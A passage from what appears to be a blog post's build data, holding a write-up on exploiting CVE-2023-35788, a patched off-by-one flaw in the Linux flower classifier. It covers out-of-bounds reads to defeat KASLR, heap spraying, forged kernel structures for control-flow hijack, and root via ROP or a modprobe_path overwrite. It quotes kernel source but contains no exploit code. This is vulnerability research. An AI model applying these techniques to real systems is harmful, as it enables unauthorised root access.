bytes. Using the 4-byte initialization to overwrite `key->enc_opts.len` allows us to bypass checks [4], [5], and [6]. Due to the checks, the value of `key->enc_opts.len` can never exceed 255 after a successful `memcpy`. However, if we need to perform out-of-bounds reads using `fl_dump_key_geneve_opt`, we must do so under the condition specified at [20], which appears somewhat tricky.\n\nHowever, if we break out of the cycle of overwriting `key->enc_opts.len` to bypass detection and perform out-of-bounds access, we should consider another functionality of `key->enc_opts.len`: locating the position of the array for incoming data packets. The length of each packet header we pass in is also in this array, upon which `fl_dump_key_geneve_opt` relies for each data read. Since we've reset `key->enc_opts.len` to a value less than 128, we can refill the array and modify `opt->length`.\n\nLet's examine this scenario.\n\n![2](../../assets/blog_img/2024-04-15/2.png)\n\nFirst, we pass in two data packets, as shown in the diagram above, with a total length of exactly 252 bytes, leaving 3 bytes remaining in the array. Then, we pass in another data packet, causing an overflow of 1 byte into `key->enc_opts.len`.\n\n![3](../../assets/blog_img/2024-04-15/3.png)\n\nAt this point, we pass in another data packet. Referring back to the `geneve_opt` structure, we know that the `length`, `r3`, `r2`, and `r1` fields together form the `key->enc_opts.len` byte. However, the `length` field will be assigned the value of the data packet length divided by 4. Therefore, if we overflow with a data packet of 96 bytes in length, `key->enc_opts.len` will precisely points to the end of the orange section.\n\n![4](../../assets/blog_img/2024-04-15/4.png)\n\nFinally, we pass in another data packet, continuously overwriting until the last 252 bytes. With this data packet, we modify the length of the header of the first 120-byte blue packet passed in initially, making it point to a fake head, and forge the fake head in the last four bytes.\n\nDue to the nature of the `fl_dump_key_geneve_opt` function, as our fake head falls within the length range of `key->enc_opts.len`, it will read the length of the fake head's data packet, resulting in an out-of-bounds read of 128 bytes.\n\nWith the out-of-bounds read, the `chain` in the `struct fl_flow_tmplt` structure serves as our target for heap leakage. In addition to the heap address, we also need function addresses to bypass KASLR protection.\n\n```c\nstatic int fl_change(struct net *net, struct sk_buff *in_skb,\n\t\t     struct tcf_proto *tp, unsigned long base,\n\t\t     u32 handle, struct nlattr **tca,\n\t\t     void **arg, u32 flags,\n\t\t     struct netlink_ext_ack *extack)\n{\n...\n\terr = fl_set_parms(net, tp, fnew, mask, base, tb, tca[TCA_RATE],\n\t\t\t   tp->chain->tmplt_priv, flags, extack);\n\tif (err)\n\t\tgoto errout;\n\n\terr = fl_check_assign_mask(head, fnew, fold, mask);\t\t\t\u003C--- [23]\n\tif (err)\n\t\tgoto errout;\n...\n}\n```\n\nExamining the function call flow of `fl_set_key`, at position [23], our passed-in key and mask are processed, and the result is stored in `f->mkey`. Unlike with the out-of-bounds write, we now have an additional structure, `struct fl_flow_mask`, that we can perform out-of-bounds reads on.\n\n```c\nstruct fl_flow_mask {\n\tstruct fl_flow_key key;\n\tstruct fl_flow_mask_range range;\n\tu32 flags;\n\tstruct rhash_head ht_node;\n\tstruct rhashtable ht;\n\tstruct rhashtable_params filter_ht_params;\n\tstruct flow_dissector dissector;\n\tstruct list_head filters;\n\tstruct rcu_work rwork;\n\tstruct list_head list;\n\trefcount_t refcnt;\n};\n\nstruct rhashtable {\n\tstruct bucket_table __rcu\t*tbl;\n\tunsigned int\t\t\tkey_len;\n\tunsigned int\t\t\tmax_elems;\n\tstruct rhashtable_params\tp;\n\tbool\t\t\t\trhlist;\n\tstruct work_struct\t\trun_work;\n\tstruct mutex                    mutex;\n\tspinlock_t\t\t\tlock;\n\tatomic_t\t\t\tnelems;\n};\n\nstruct rhashtable_params {\n\tu16\t\t\tnelem_hint;\n\tu16\t\t\tkey_len;\n\tu16\t\t\tkey_offset;\n\tu16\t\t\thead_offset;\n\tunsigned int\t\tmax_size;\n\tu16\t\t\tmin_size;\n\tbool\t\t\tautomatic_shrinking;\n\trht_hashfn_t\t\thashfn;\t\t\t\t\t\t\t\t\u003C--- here\n\trht_obj_hashfn_t\tobj_hashfn;\n\trht_obj_cmpfn_t\t\tobj_cmpfn;\n};\n```\n\nAfter inspecting the structure of `fl_flow_mask`, we find a function pointer `hashfn`, which serves as our function pointer to bypass KASLR! In my exploitation, it is assigned the `rhashtable_jhash2` function.\n\n### off-by-one translates to control flow hijacking\n\nIndeed, the situation is quite clear now.\n\n```c\nstruct fl_flow_tmplt {\n\tstruct fl_flow_key dummy_key;\n\tstruct fl_flow_key mask;\n\tstruct flow_dissector dissector;\n\tstruct tcf_chain *chain;\t\t\u003C--- [24]\n};\n\nstruct tcf_chain {\n\t/* Protects filter_chain. */\n\tstruct mutex filter_chain_lock;\n\tstruct tcf_proto __rcu *filter_chain;\n\tstruct list_head list;\n\tstruct tcf_block *block;\t\t\u003C--- [25]\n\tu32 index; /* chain index */\n\tunsigned int refcnt;\n\tunsigned int action_refcnt;\n\tbool explicitly_created;\n\tbool flushing;\n\tconst struct tcf_proto_ops *tmplt_ops;\n\tvoid *tmplt_priv;\n\tstruct rcu_head rcu;\n};\n\nstruct tcf_block {\n\t/* Lock protects tcf_block and lifetime-management data of chains\n\t * attached to the block (refcnt, action_refcnt, explicitly_created).\n\t */\n\tstruct mutex lock;\n\tstruct list_head chain_list;\n\tu32 index; /* block index for shared blocks */\n\tu32 classid; /* which class this block belongs to */\n\trefcount_t refcnt;\n\tstruct net *net;\n\tstruct Qdisc *q;\n\tstruct rw_semaphore cb_lock; /* protects cb_list and offload counters */\n\tstruct flow_block flow_block;\t\u003C--- [26]\n...\n}\n\nstruct flow_block_cb {\n\tstruct list_head\tdriver_list;\n\tstruct list_head\tlist;\n\tflow_setup_cb_t\t\t*cb;\t\t\u003C--- [27]\n\tvoid\t\t\t*cb_ident;\n\tvoid\t\t\t*cb_priv;\n\tvoid\t\t\t(*release)(void *cb_priv);\n\tstruct flow_block_indr\tindr;\n\tunsigned int\t\trefcnt;\n};\n```\n\nWe need to forge from [24] to [27], which requires full control over our known heap address. Here, I utilize the fuse+setxattr technique for heap spraying, allowing further control over the heap contents. For more information about this technique, refer to the provided links [2] and [4].\n\n```c\nstatic int\n__tc_setup_cb_call(struct tcf_block *block, enum tc_setup_type type,\n\t\t   void *type_data, bool err_stop)\n{\n\tstruct flow_block_cb *block_cb;\n\tint ok_count = 0;\n\tint err;\n\n\tlist_for_each_entry(block_cb, &block->flow_block.cb_list, list) {\n\t\terr = block_cb->cb(type, type_data, block_cb->cb_priv);\n\t\tif (err) {\n\t\t\tif (err_stop)\n\t\t\t\treturn err;\n\t\t} else {\n\t\t\tok_count++;\n\t\t}\n\t}\n\treturn ok_count;\n}\n```\n\nIt's worth mentioning that, since we can forge the `cb` virtual function and control the third parameter `block_cb->cb_priv`, there are two potential privilege escalation strategies: one is direct ROP (Return-Oriented Programming), and the other is to find a suitable function to hijack control flow and convert it into arbitrary address read/write.\n\n![5](../../assets/blog_img/2024-04-15/5.png)\n\nAs shown in the diagram above, we control four registers: `rdx`, `rcx` (utilized through multiple loops), `rax`, and `rip`. By using appropriate ROP gadgets, executing `commit_cred(prepare_kernel_cred(0))` can accomplish privilege escalation.\n\nThe technique used to return to user mode is `swapgs_restore_regs_and_return_to_usermode`. For more information on this technique, please refer to the provided link [3].\n\nHowever, ROP (Return-Oriented Programming) is generally not very stable and requires extensive modifications to adapt to different kernel versions. Therefore, in the final version, I found a suitable function, `dbg_set_reg`, and `dbg_get_reg` (these two functions are available by default in Ubuntu), and combined them to modify `modprobe_path` to achieve privilege escalation.\n\n## 0x03 The End\n\nThank you for reading. If you have any questions, feel free to contact us.\n\n## 0x04 Reference\n\n[cve-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)\n\n[cve-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html)\n\n[KPTI_bypass](https://www.anquanke.com/post/id/240006)\n\n[Exploiting_race_conditions_on_ancient_Linux](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf)\n\n[commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4d56304e5827c8cc8cc18c75343d283af7c4825c)","src/content/blog/2024-04-15-CVE-2023-35788.md",[93,94,95,96,97,98,99,100],"../../assets/blog_img/2024-04-15/meme1.jpeg","../../assets/blog_img/2024-04-15/meme2.png","../../assets/blog_img/2024-04-15/1.png","../../assets/blog_img/2024-04-15/2.png","../../assets/blog_img/2024-04-15/3.png","../../assets/blog_img/2024-04-15/4.png","../../assets/blog_img/2024-04-15/5.png","/src/assets/blog_img/2024-04-15/linux.jpg","6d7bf68272b6dd9f",{"html":103,"metadata":104},"\u003Ch2 id=\"0x00-introduction\">0x00 Introduction\u003C/h2>\n\u003Cp>The vulnerability is an off-by-one flaw located within the Linux network scheduler subsystem (NET_SCHED). It allows bypassing all protective measures (though a new namespace needs to be created) and enables privilege escalation on Linux systems.\u003C/p>\n\u003Cp>NET_SCHED in Linux is the Network Scheduler subsystem, which is responsible for traffic scheduling and management in the network stack. It provides a range of scheduling algorithms and queue management mechanisms, including priority queuing, token bucket scheduling, and random early detection, enabling users to flexibly control and optimize network traffic as needed.\u003C/p>\n\u003Cp>This vulnerability is not a new one. It was already patched in Linux 6.4-rc5 (June 2023) by us. However, due to its interesting nature, involving out-of-bounds access within a structure, it does not cause a kernel crash when triggered. Moreover, its exploit stability is quite high. So, I have decided to outline the exploitation approach for this vulnerability.\u003C/p>\n\u003Cp>Since NET_SCHED is a well-known module that has experienced several vulnerabilities (you can check KCTF). This article will focus solely on the vulnerability itself.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/meme1.jpeg&#x22;,&#x22;alt&#x22;:&#x22;meme1&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Ch2 id=\"0x01-vulnerability-analysis\">0x01 Vulnerability Analysis\u003C/h2>\n\u003Cp>The vulnerability occurs in the Flower classifier of NET_SCHED.\u003C/p>\n\u003Cp>The core function containing the vulnerability is \u003Ccode>fl_set_geneve_opt()\u003C/code>. Below is the code snippet provided:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_set_geneve_opt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">const\u003C/span>\u003Cspan style=\"color:#F97583\"> struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">nla\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">key\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t     int\u003C/span>\u003Cspan style=\"color:#FFAB70\"> depth\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#FFAB70\"> option_len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t     struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> netlink_ext_ack \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">extack\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">class \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">opt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err, data_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (option_len \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tdata_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> option_len \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">key->enc_opts.data[key->enc_opts.len];\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tmemset\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opt, \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, option_len);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->length \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len \u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->r1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->r2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->r3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* If no mask has been prodived we assume an exact match. */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">depth)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_type\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TCA_FLOWER_KEY_ENC_OPTS_GENEVE) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Non-geneve option type for mask\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_parse_nested_deprecated\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(tb,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t  TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t  nla, geneve_opt_policy, extack);\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* We are not allowed to omit any of CLASS, TYPE or DATA\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * fields from the key.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">option_len \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t    (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS] \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t     !\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE] \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t     !\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA])) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Missing tunnel key geneve option class, type or data\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* Omitting any of CLASS, TYPE or DATA fields is allowed\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * for the mask.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key->enc_opts.len;\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tdata \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tdata_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(data);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (data_len \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Tunnel key geneve option data is less than 4 bytes long\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ERANGE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (data_len \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Tunnel key geneve option data is not a multiple of 4 bytes long\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ERANGE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tnew_len \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tBUILD_BUG_ON\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(FLOW_DIS_TUN_OPTS_MAX \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> 